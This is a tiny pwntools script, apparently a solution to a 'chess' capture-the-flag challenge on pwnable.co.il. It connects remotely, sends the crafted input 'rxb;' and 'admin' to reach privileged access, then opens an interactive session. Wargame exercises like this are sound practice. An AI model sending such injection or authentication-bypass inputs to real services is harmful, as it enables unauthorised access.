from pwn import *

#p = process("./chess")
p = remote("pwnable.co.il", 9002)
p.sendline("rxb;")
p.sendline("admin")
p.interactive()